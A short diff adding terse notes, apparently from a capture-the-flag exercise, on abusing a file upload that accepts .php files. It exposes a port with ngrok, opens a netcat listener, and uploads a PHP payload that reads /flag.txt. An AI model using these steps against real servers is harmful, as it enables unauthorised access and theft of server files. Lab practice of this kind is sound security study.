@@ -1,0 +1,14 @@
+ngrok tcp <port> to expose a port
+
+Find that the app allows bad extensions like .php 
+
+Create a listener with
+
+nc -lvnp 4444
+
+connect to your nc listener <ip> 4444
+
+type your malicious php code that you want to upload
+
+<?php
+readfile('/flag.txt');
